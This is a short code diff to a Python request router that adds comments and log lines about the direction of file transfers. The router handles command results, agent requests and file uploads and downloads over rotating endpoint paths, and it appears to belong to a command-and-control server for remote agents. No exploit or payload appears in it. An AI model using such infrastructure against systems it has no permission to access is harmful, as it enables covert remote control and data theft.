@@ -196,8 +196,12 @@ class OperationRouter:
                 elif operation_type == "result":
                     self.result_handler.handle()
                 elif operation_type == "file_up":
+                    # Handle file upload FROM client TO server (saving to downloads folder)
+                    logger.info(f"Handling file upload FROM client TO server (saving to downloads folder)")
                     self.file_handler.handle()
                 elif operation_type == "file_down":
+                    # Handle file download FOR client FROM server (reading from uploads folder)
+                    logger.info(f"Handling file download FOR client FROM server (reading from uploads folder)")
                     self.file_download_handler.handle()
                 elif operation_type == "agent":
                     self.agent_handler.handle_agent_request()
@@ -210,8 +214,12 @@ class OperationRouter:
                     elif endpoint_type in ["cmd_result_path", "previous_cmd_result_path", "old_cmd_result_path"]:
                         self.result_handler.handle()
                     elif endpoint_type in ["file_upload_path", "previous_file_upload_path", "old_file_upload_path"]:
+                        # Path is for uploading FROM client TO server
+                        logger.info(f"Routing by path: file upload FROM client TO server")
                         self.file_handler.handle()
                     elif endpoint_type in ["file_request_path", "previous_file_request_path", "old_file_request_path"]:
+                        # Path is for downloading FROM server TO client
+                        logger.info(f"Routing by path: file download FROM server TO client")
                         self.file_download_handler.handle()
                     else:
                         # Unknown operation type, log and send generic response
